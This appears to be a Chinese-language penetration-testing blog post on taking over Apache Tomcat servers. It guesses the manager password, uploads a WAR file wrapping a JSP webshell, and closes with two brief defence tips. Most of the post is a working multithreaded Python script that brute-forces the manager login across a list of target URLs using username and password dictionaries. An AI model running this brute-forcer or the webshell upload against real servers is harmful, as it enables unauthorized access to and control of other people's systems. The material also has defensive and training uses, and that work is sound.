<!DOCTYPE html>
<html lang="en">
  <head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <meta name="description" content=""/>
  <meta name="author" content="Reber"/>
  
    
      <title>Tomcat 部署 War 包 getshell | Reber&#39;s Blog</title>
    
  
  <link rel="stylesheet" href="/css/reset.css"/>
  
  <link rel="stylesheet" href="/css/smigle.css"/>
  
    <link rel="stylesheet" href="/css/monokai-sublime.min.css"/>
  
    <link rel="stylesheet" href="/css/style.css"/>
  
  
    <script src="/js/jquery-3.6.0.min.js"/></script>
  
    <script src="/js/highlight.min.js"/></script>
  
    <script src="/js/style.js"/></script>
  
  <link rel="icon" type="image/img" sizes="16x16" href="/img/logo.png">
  <meta name="msapplication-TileColor" content="#da532c">
  <meta name="theme-color" content="#ffffff">
</head>

  <body>
    <header>
  <div id="brand">
    <a class="icon-link" href="https://wyb0.com/">
      <img
        class="icon"
        src="/img/logo.png"
      />
    </a>
    <div class="text">
      <a href="https://wyb0.com/"><h1>Reber&#39;s Blog</h1></a>
      <h3>只会一点点编程、只会一点点渗透</h3>
    </div>
  </div>
  <nav>
    
      
        
        <a href="/"><b>Home</b></a>
      
         | 
        <a href="/posts/"><b>Posts</b></a>
      
         | 
        <a href="/categories/"><b>Categories</b></a>
      
         | 
        <a href="/tags/"><b>Tags</b></a>
      
         | 
        <a href="/about/"><b>About</b></a>
      
         | 
        <a href="/friends/"><b>Friends</b></a>
      
    
  </nav>
  <hr />
</header>

    <div id="content">
      
  <main>
    <article>
      <h1>Tomcat 部署 War 包 getshell</h1>
      
<div class="post-meta">
    <time>2016-08-02</time>
    
    [<a href="/categories/Pentest">Pentest</a>](<a href="/tags/getshell">getshell</a>)
</div>

      <div><h3 id="0x00-关于-war-包">0x00 关于 War 包</h3>
<pre tabindex="0"><code>War包一般是进行Web开发时一个网站Project下的所有代码,包括前台HTML/CSS/JS代码,
以及Java的代码。当开发人员开发完毕时,就会将源码打包给测试人员测试,测试完后若要发布
则也会打包成War包进行发布。War包可以放在Tomcat下的webapps或word目录,当Tomcat
服务器启动时,War包也会随之被解压后自动部署。
</code></pre><h3 id="0x01-上传-war-包-getshell">0x01 上传 War 包 GetShell</h3>
<ul>
<li>
<p>找到后台猜密码然后登录
<img src="/img/post/tomcat_vul_background.png" alt="70">
<img src="/img/post/tomcat_vul_login.png" alt="40">
<img src="/img/post/tomcat_vul_war_login_success.png" alt="30"></p>
</li>
<li>
<p>上传 War 包</p>
</li>
</ul>
<p>运行 jar -cf job.war ./job.jsp 生成 war 包</p>
<p>或者先将 jsp 大马压缩为 zip，再将 zip 后缀改名为 war ，然后上传 war 包</p>
<p><img src="/img/post/tomcot_vul_put_war.png" alt="50">
<img src="/img/post/tomcot_vul_put_war_success.png" alt="40">
<img src="/img/post/tomcot_vul_visit_shell1.png" alt="60">
<img src="/img/post/tomcot_vul_visit_shell2.png" alt="60"></p>
<h3 id="0x02-漏洞防御">0x02 漏洞防御</h3>
<ul>
<li>后台使用强密码</li>
<li>删除Tomcat下的manager文件夹</li>
</ul>
<h3 id="0x03-附爆破弱口令代码">0x03 附爆破弱口令代码</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#-*- coding:utf-8 -*-</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> json
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> base64
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> sys
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> Queue
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> threading
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">简单爆破后台登陆密码
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Usage: python tomcat.py username.txt password.txt urlfile.txt
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">username.txt为用户名字典
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">password.txt为密码字典
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">urlfile.txt为后台url列表
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_username</span>(userfile):
</span></span><span style="display:flex;"><span>    username <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">with</span> open(userfile, <span style="color:#e6db74">&#39;r&#39;</span>) <span style="color:#66d9ef">as</span> f:
</span></span><span style="display:flex;"><span>        lines <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>readlines()
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> line <span style="color:#f92672">in</span> lines:
</span></span><span style="display:flex;"><span>            username<span style="color:#f92672">.</span>append(line<span style="color:#f92672">.</span>strip())
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> username
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_pwd</span>(passfile):
</span></span><span style="display:flex;"><span>    password <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">with</span> open(passfile, <span style="color:#e6db74">&#39;r&#39;</span>) <span style="color:#66d9ef">as</span> f:
</span></span><span style="display:flex;"><span>        lines <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>readlines()
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> line <span style="color:#f92672">in</span> lines:
</span></span><span style="display:flex;"><span>            password<span style="color:#f92672">.</span>append(line<span style="color:#f92672">.</span>strip())
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> password
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_url</span>(urlfile):
</span></span><span style="display:flex;"><span>    urllist <span style="color:#f92672">=</span> Queue<span style="color:#f92672">.</span>Queue()
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">with</span> open(urlfile,<span style="color:#e6db74">&#39;r&#39;</span>) <span style="color:#66d9ef">as</span> f:
</span></span><span style="display:flex;"><span>        lines <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>readlines()
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> line <span style="color:#f92672">in</span> lines:
</span></span><span style="display:flex;"><span>            urllist<span style="color:#f92672">.</span>put(line<span style="color:#f92672">.</span>strip())
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> urllist
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">thread</span>(f,urls,names,pwds):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> <span style="color:#f92672">not</span> urls<span style="color:#f92672">.</span>empty():
</span></span><span style="display:flex;"><span>        s <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>Session()
</span></span><span style="display:flex;"><span>        url <span style="color:#f92672">=</span> urls<span style="color:#f92672">.</span>get()
</span></span><span style="display:flex;"><span>        resp <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>get(url,timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">10</span>)  <span style="color:#75715e">#用于记录cookie</span>
</span></span><span style="display:flex;"><span>        Referer <span style="color:#f92672">=</span> resp<span style="color:#f92672">.</span>url
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        headers <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#39;User-Agent&#39;</span>: <span style="color:#e6db74">&#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0&#39;</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#39;Referer&#39;</span>: Referer,
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        bgurl <span style="color:#f92672">=</span> url <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;manager/html&#39;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># print bgurl</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> name <span style="color:#f92672">in</span> names:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span> pwd <span style="color:#f92672">in</span> pwds:
</span></span><span style="display:flex;"><span>                authorize <span style="color:#f92672">=</span> name <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;:&#39;</span> <span style="color:#f92672">+</span> pwd
</span></span><span style="display:flex;"><span>                Basic <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Basic &#34;</span> <span style="color:#f92672">+</span> base64<span style="color:#f92672">.</span>b64encode(authorize)
</span></span><span style="display:flex;"><span>                headers[<span style="color:#e6db74">&#39;Authorization&#39;</span>] <span style="color:#f92672">=</span> Basic
</span></span><span style="display:flex;"><span>                <span style="color:#75715e"># print json.dumps(headers, indent=4)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                proxy <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>                    <span style="color:#e6db74">&#39;http&#39;</span>:<span style="color:#e6db74">&#39;http://127.0.0.1:1080&#39;</span>
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                resp <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>get(bgurl,headers<span style="color:#f92672">=</span>headers,proxies<span style="color:#f92672">=</span>proxy,timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">10</span>)
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> resp<span style="color:#f92672">.</span>status_code <span style="color:#f92672">==</span> <span style="color:#ae81ff">200</span>:
</span></span><span style="display:flex;"><span>                    s <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;[Ok] </span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">:</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> (bgurl,name,pwd)
</span></span><span style="display:flex;"><span>                    print s
</span></span><span style="display:flex;"><span>                    f<span style="color:#f92672">.</span>write(s)
</span></span><span style="display:flex;"><span>                    exit()
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>                    print <span style="color:#e6db74">&#39;[Error] &#39;</span> <span style="color:#f92672">+</span> bgurl <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">+</span> name <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;:&#39;</span> <span style="color:#f92672">+</span> pwd
</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># break</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> len(sys<span style="color:#f92672">.</span>argv) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">4</span>:
</span></span><span style="display:flex;"><span>        print <span style="color:#e6db74">&#34;Usage: python tomcat.py username.txt password.txt urlfile.txt&#34;</span>
</span></span><span style="display:flex;"><span>        exit()
</span></span><span style="display:flex;"><span>    userfile <span style="color:#f92672">=</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>]
</span></span><span style="display:flex;"><span>    passfile <span style="color:#f92672">=</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">2</span>]
</span></span><span style="display:flex;"><span>    urlfile <span style="color:#f92672">=</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">3</span>]
</span></span><span style="display:flex;"><span>    names <span style="color:#f92672">=</span> get_pwd(userfile)
</span></span><span style="display:flex;"><span>    pwds <span style="color:#f92672">=</span> get_pwd(passfile)
</span></span><span style="display:flex;"><span>    urls <span style="color:#f92672">=</span> get_url(urlfile)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    tlist <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span>    f <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#34;result.txt&#34;</span>,<span style="color:#e6db74">&#34;a+&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> xrange(<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">50</span>):
</span></span><span style="display:flex;"><span>        t <span style="color:#f92672">=</span> threading<span style="color:#f92672">.</span>Thread(target<span style="color:#f92672">=</span>thread,args<span style="color:#f92672">=</span>(f,urls,names,pwds,))
</span></span><span style="display:flex;"><span>        tlist<span style="color:#f92672">.</span>append(t)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> t <span style="color:#f92672">in</span> tlist:
</span></span><span style="display:flex;"><span>        t<span style="color:#f92672">.</span>start()
</span></span><span style="display:flex;"><span>    t<span style="color:#f92672">.</span>join()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>main()
</span></span></code></pre></div></div>
    </article>
  </main>

    </div>
    <footer>
  <hr />
  
    <p id="social">
      Find me around the web:
      
        
        <a href="https://github.com/reber0?_blank">GitHub</a>
      
         • 
        <a href="https://weibo.com/u/5819760166?_blank">Weibo</a>
      
    </p>
  
  <p class="copyright">
    Copyright © 2015-2023
    <a href="https://wyb0.com/"><strong>Reber</strong></a>.

    Built with
    <a href="http://www.gohugo.io/">Hugo</a>,
    based on the theme
    <a href="https://gitlab.com/ian-s-mcb/smigle-hugo-theme">smigle</a>.
  </p>
</footer>

  </body>
</html>
